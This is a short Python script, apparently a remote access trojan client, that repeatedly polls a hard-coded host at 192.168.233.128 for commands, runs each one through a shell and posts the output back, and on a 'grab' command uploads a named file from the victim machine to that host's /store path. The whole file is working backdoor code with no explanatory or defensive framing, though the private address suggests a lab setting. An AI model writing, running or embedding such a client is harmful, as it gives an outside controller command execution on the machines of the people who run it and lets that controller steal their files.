import requests
import subprocess
import time
import os


while True:
    req = requests.get('http://192.168.233.128')
    command = req.text

    if 'terminate' in command:
        break

    elif 'grab' in command:
        grab,path = command.split('*')
        if os.path.exists(path):
            url = 'http://192.168.233.128/store'
            files = {'file': open(path,'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.233.128',data='[-] File not found')

        
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.233.128', data = CMD.stdout.read())
        post_response = requests.post(url='http://192.168.233.128', data = CMD.stderr.read())

    time.sleep(2)
